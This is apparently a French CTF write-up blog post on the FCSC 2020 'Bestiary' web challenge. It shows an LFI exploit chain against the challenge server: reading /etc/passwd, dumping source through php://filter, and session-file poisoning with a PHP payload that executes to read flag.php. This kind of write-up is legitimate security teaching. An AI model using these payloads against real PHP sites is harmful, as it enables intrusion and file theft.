<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>üìã FCSC 2020 - Web - Bestiary - Thomza - Blog</title><meta name=Description content><meta property="og:title" content="üìã FCSC 2020 - Web - Bestiary"><meta property="og:description" content="Write-up du challenge web Bestiary du France Cybersecurity Challenge 2020"><meta property="og:type" content="article"><meta property="og:url" content="https://thyzavard.github.io/posts/wu_ecsc_20/"><meta property="og:image" content="https://thyzavard.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-05-10T10:30:00+02:00"><meta property="article:modified_time" content="2020-05-10T10:30:00+02:00"><meta property="og:site_name" content="Thomza - Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://thyzavard.github.io/logo.png"><meta name=twitter:title content="üìã FCSC 2020 - Web - Bestiary"><meta name=twitter:description content="Write-up du challenge web Bestiary du France Cybersecurity Challenge 2020"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://thyzavard.github.io/posts/wu_ecsc_20/><link rel=prev href=https://thyzavard.github.io/posts/wu_angstrom_20/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><link rel=stylesheet href=https://thyzavard.github.io/css/main.css><script type=text/javascript src=https://thyzavard.github.io/js/main.js></script>
<script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"üìã FCSC 2020 - Web - Bestiary","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/thyzavard.github.io\/posts\/wu_ecsc_20\/"},"genre":"posts","keywords":"CTF, Web","wordcount":440,"url":"https:\/\/thyzavard.github.io\/posts\/wu_ecsc_20\/","datePublished":"2020-05-10T10:30:00+02:00","dateModified":"2020-05-10T10:30:00+02:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Thomza"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Thomza - Blog"><span class=header-title-pre>üóø</span>Thomza</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>üñäÔ∏è Posts </a><a class=menu-item href=/photography/>üì∑ Photography </a><a class=menu-item href=/categories/>üìÇ Categories </a><a class=menu-item href=/tags/>üè∑Ô∏è Tags </a><a class=menu-item href=/about/>üóø About me </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Thomza - Blog"><span class=header-title-pre>üóø</span>Thomza</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>üñäÔ∏èPosts</a><a class=menu-item href=/photography/ title>üì∑Photography</a><a class=menu-item href=/categories/ title>üìÇCategories</a><a class=menu-item href=/tags/ title>üè∑Ô∏èTags</a><a class=menu-item href=/about/ title>üóøAbout me</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><article class="page single"><h1 class="single-title animate__animated animate__flipInX">üìã FCSC 2020 - Web - Bestiary</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Thomza</a></span>&nbsp;<span class=post-category>included in <a href=/categories/write-up/><i class="far fa-folder fa-fw" aria-hidden=true></i>Write up</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2020-05-10>2020-05-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;440 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;3 minutes&nbsp;</div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_ecsc_20/fcsc_bestiary.PNG data-srcset="/posts/wu_ecsc_20/fcsc_bestiary.PNG, /posts/wu_ecsc_20/fcsc_bestiary.PNG 1.5x, /posts/wu_ecsc_20/fcsc_bestiary.PNG 2x" data-sizes=auto alt=/posts/wu_ecsc_20/fcsc_bestiary.PNG title=Challenge width=493 height=340></p><p>Bestiary a √©t√© mon challenge pr√©f√©r√©, l&rsquo;exploitation de la LFI √©tait tr√®s int√©ressante !</p><p>C&rsquo;est un site o√π l&rsquo;on peut simplement effectuer des recherches sur des monstres.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_ecsc_20/fcsc_home.PNG data-srcset="/posts/wu_ecsc_20/fcsc_home.PNG, /posts/wu_ecsc_20/fcsc_home.PNG 1.5x, /posts/wu_ecsc_20/fcsc_home.PNG 2x" data-sizes=auto alt=/posts/wu_ecsc_20/fcsc_home.PNG title=Home width=758 height=685></p><p>On devine assez rapidement que la param√®tre &lsquo;monster&rsquo; de la requ√™te GET est √† injecter.<br>On test un payload classique pour voir s&rsquo;il est possible d&rsquo;avoir une LFI :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-make data-lang=make><span class=line><span class=cl><span class=nf>http</span><span class=o>:</span>//<span class=n>challenges</span>2.<span class=n>france</span>-<span class=n>cybersecurity</span>-<span class=n>challenge</span>.<span class=n>fr</span>:5004/<span class=n>index</span>.<span class=n>php</span>?<span class=n>monster</span>=../../../../<span class=n>etc</span>/<span class=n>passwd</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_ecsc_20/fcsc_lfi_etc.PNG data-srcset="/posts/wu_ecsc_20/fcsc_lfi_etc.PNG, /posts/wu_ecsc_20/fcsc_lfi_etc.PNG 1.5x, /posts/wu_ecsc_20/fcsc_lfi_etc.PNG 2x" data-sizes=auto alt=/posts/wu_ecsc_20/fcsc_lfi_etc.PNG title=LFI width=1000 height=303></p><p>On √† donc une LFI :)<br>On tente d&rsquo;afficher le code source avec un filter PHP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-make data-lang=make><span class=line><span class=cl><span class=nf>http</span><span class=o>:</span>//<span class=n>challenges</span>2.<span class=n>france</span>-<span class=n>cybersecurity</span>-<span class=n>challenge</span>.<span class=n>fr</span>:5004/<span class=n>index</span>.<span class=n>php</span>?<span class=n>monster</span>=<span class=n>php</span>://<span class=n>filter</span>/<span class=n>convert</span>.<span class=n>base</span>64-<span class=n>encode</span>/<span class=n>resource</span>=<span class=n>index</span>.<span class=n>php</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_ecsc_20/fcsc_bestiary_base.PNG data-srcset="/posts/wu_ecsc_20/fcsc_bestiary_base.PNG, /posts/wu_ecsc_20/fcsc_bestiary_base.PNG 1.5x, /posts/wu_ecsc_20/fcsc_bestiary_base.PNG 2x" data-sizes=auto alt=/posts/wu_ecsc_20/fcsc_bestiary_base.PNG title=Base width=1352 height=236></p><p>On d√©code tout √ßa en base64 et on obtient le code source la page <code>index.php</code> :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nx>session_save_path</span><span class=p>(</span><span class=s2>&#34;./sessions/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>include_once</span><span class=p>(</span><span class=s1>&#39;flag.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;title&gt;Bestiary&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;body style=&#34;background-color:#3CB371;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;center&gt;&lt;h1&gt;Bestiary&lt;/h1&gt;&lt;/center&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;script&gt;
</span></span></span><span class=line><span class=cl><span class=err>function show()
</span></span></span><span class=line><span class=cl><span class=err>{
</span></span></span><span class=line><span class=cl><span class=err>	var monster = document.getElementById(&#34;monster&#34;).value;
</span></span></span><span class=line><span class=cl><span class=err>	document.location.href = &#34;index.php?monster=&#34;+monster;
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;p&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>	$monster = NULL;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>	if(isset($_SESSION[&#39;monster&#39;]) &amp;&amp; !empty($_SESSION[&#39;monster&#39;]))
</span></span></span><span class=line><span class=cl><span class=err>		$monster = $_SESSION[&#39;monster&#39;];
</span></span></span><span class=line><span class=cl><span class=err>	if(isset($_GET[&#39;monster&#39;]) &amp;&amp; !empty($_GET[&#39;monster&#39;]))
</span></span></span><span class=line><span class=cl><span class=err>	{
</span></span></span><span class=line><span class=cl><span class=err>		$monster = $_GET[&#39;monster&#39;];
</span></span></span><span class=line><span class=cl><span class=err>		$_SESSION[&#39;monster&#39;] = $monster;
</span></span></span><span class=line><span class=cl><span class=err>	}
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>	if($monster !== NULL &amp;&amp; strpos($monster, &#34;flag&#34;) === False)
</span></span></span><span class=line><span class=cl><span class=err>		include($monster);
</span></span></span><span class=line><span class=cl><span class=err>	else
</span></span></span><span class=line><span class=cl><span class=err>		echo &#34;Select a monster to read his description.&#34;;
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;select id=&#34;monster&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;beholder&#34;&gt;Beholder&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;displacer_beast&#34;&gt;Displacer Beast&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;mimic&#34;&gt;Mimic&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;rust_monster&#34;&gt;Rust Monster&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;gelatinous_cube&#34;&gt;Gelatinous Cube&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;owlbear&#34;&gt;Owlbear&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;lich&#34;&gt;Lich&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;the_drow&#34;&gt;The Drow&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;mind_flayer&#34;&gt;Mind Flayer&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;option value=&#34;tarrasque&#34;&gt;Tarrasque&lt;/option&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/select&gt; 
</span></span></span><span class=line><span class=cl><span class=err>    &lt;input type=&#34;button&#34; value=&#34;show description&#34; onclick=&#34;show()&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div style=&#34;font-size:70%&#34;&gt;Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030&lt;/div&gt;&lt;br /&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></div><p>En analysant le code source, on remarque plusieurs choses int√©ressantes :</p><ul><li>La fonction <code>strpos()</code> est utilis√©e pour v√©rifier que le payload ne contienne pas la cha√Æne de caract√®res &ldquo;flag&rdquo;</li><li>Le r√©pertoire o√π sont stock√©es les sessions est sp√©cifi√© &ldquo;en dur&rdquo; via la fonction <code>session_save_path()</code>, alors qu&rsquo;habituellement, ces derni√®res sont stock√©es &mldr;</li><li>Le flag est stock√© dans le fichier <code>flag.php</code></li></ul><p>Pour acc√©der √† une session, il faut rajouter le pr√©fix <code>sess_</code> au num√©ro de session stock√©es dans notre navigateur.<br><em>Par exemple, j&rsquo;avais la session c70091bbb2c30521812c43b37040255a, sur le serveur, la session est stock√©e dans le fichier /sessions/sess_c70091bbb2c30521812c43b37040255a</em></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_ecsc_20/fcsc_bestiary_session.PNG data-srcset="/posts/wu_ecsc_20/fcsc_bestiary_session.PNG, /posts/wu_ecsc_20/fcsc_bestiary_session.PNG 1.5x, /posts/wu_ecsc_20/fcsc_bestiary_session.PNG 2x" data-sizes=auto alt=/posts/wu_ecsc_20/fcsc_bestiary_session.PNG title=Session width=940 height=84></p><p>On peut voir le contenu de ma session sur la capture d&rsquo;√©cran ci-dessus.<br>Comme en PHP, tout fichier inclut via la fonction <code>include()</code> est trait√© comme un fichier PHP, on va pouvoir injecter du code PHP dans le cookie PHPSESSID afin de le faire ex√©cuter au serveur lorsque l&rsquo;on va acc√©der √† la session.</p><p>Je vais utiliser le payload suivant pour lire le fichier contenant le flag :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s1>&#39;ZmxhZy5waHA=&#39;</span><span class=p>)));</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>J&rsquo;ai encod√© le nom du fichier en base64 √† cause de la fonction <code>strpos()</code> qui d√©tecte si la cha√Æne &ldquo;flag&rdquo; est pr√©sente dans le param√®tre GET &lsquo;monter&rsquo;.<br>J&rsquo;injecte donc ce payload dans ma session en effectuant la requ√™te suivante :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-make data-lang=make><span class=line><span class=cl><span class=nf>http</span><span class=o>:</span>//<span class=n>challenges</span>2.<span class=n>france</span>-<span class=n>cybersecurity</span>-<span class=n>challenge</span>.<span class=n>fr</span>:5004//<span class=n>index</span>.<span class=n>php</span>?<span class=n>monster</span>=%3<span class=n>C</span>?<span class=n>php</span>%20<span class=n>var_dump</span>(<span class=n>file_get_contents</span>(<span class=n>base</span>64<span class=n>_decode</span>(%27<span class=n>ZmxhZy</span>5<span class=n>waHA</span>=%27)));%20?%3<span class=n>E</span>
</span></span></code></pre></div><p>√Ä ce stage, il ne me reste plus qu&rsquo;√† inclure le fichier contenant les informations de ma session, afin que le code PHP soit ex√©cut√©.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-make data-lang=make><span class=line><span class=cl><span class=nf>http</span><span class=o>:</span>//<span class=n>challenges</span>2.<span class=n>france</span>-<span class=n>cybersecurity</span>-<span class=n>challenge</span>.<span class=n>fr</span>:5004//<span class=n>index</span>.<span class=n>php</span>?<span class=n>monster</span>=<span class=n>sessions</span>/<span class=n>sess_c</span>70091<span class=n>bbb</span>2<span class=n>c</span>30521812<span class=n>c</span>43<span class=n>b</span>37040255<span class=n>a</span>
</span></span></code></pre></div><p>On affiche les sources et voil√† !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_ecsc_20/fcsc_bestiary_flag.PNG data-srcset="/posts/wu_ecsc_20/fcsc_bestiary_flag.PNG, /posts/wu_ecsc_20/fcsc_bestiary_flag.PNG 1.5x, /posts/wu_ecsc_20/fcsc_bestiary_flag.PNG 2x" data-sizes=auto alt=/posts/wu_ecsc_20/fcsc_bestiary_flag.PNG title=FLAG width=1259 height=341></p><p>Flag :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-make data-lang=make><span class=line><span class=cl><span class=err>FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}</span>
</span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2020-05-10</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/web/>Web</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/wu_angstrom_20/ class=prev rel=prev title="üìã √•ngstromCTF 2020"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>üìã √•ngstromCTF 2020</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Thomza</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>